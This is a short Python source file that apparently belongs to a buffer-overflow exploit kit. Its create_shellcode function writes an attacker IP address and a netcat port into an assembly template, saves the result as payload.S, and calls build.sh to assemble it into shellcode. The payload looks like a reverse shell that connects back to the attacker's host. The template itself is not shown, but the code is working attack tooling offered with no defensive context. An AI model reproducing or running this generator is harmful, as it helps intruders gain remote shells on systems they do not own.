import os
import socket
import colorama
import subprocess

def create_shellcode(ip_addr=None, nc_port=1799, template_file="template.S", cwd="buffer_overflow/"):
    '''
    This function compiles and links the provided shellcode
    '''
    ip = ip_addr.split(".")

    # Read the template
    lines = None
    with open(cwd+template_file, 'r') as template:
        lines = template.readlines()

    # Create payload.S
    with open(cwd+"payload.S", 'w+') as payload:
        for i in range(len(lines)):
            lines[i] = lines[i].replace("<IP1>", str(ip[0]))
            lines[i] = lines[i].replace("<IP2>", str(ip[1]))
            lines[i] = lines[i].replace("<IP3>", str(ip[2]))
            lines[i] = lines[i].replace("<IP4>", str(ip[3]))
            lines[i] = lines[i].replace("<PORT>", str(nc_port))
        payload.writelines(lines)
    return build_shellcode("payload.S", cwd)


def build_shellcode(file_path, cwd="buffer_overflow/"):
    '''
    Runs build.sh which converts generated payload.S to binary
    '''
    # Run subprocess build.sh
    process = subprocess.Popen(["bash", "build.sh", file_path], cwd=cwd)
    output, error = process.communicate()

    # Check errors
    if error is not None:
        print(colorama.Fore.RED + "[!] Error while building shellcode!")
        print(output)

    return error is None
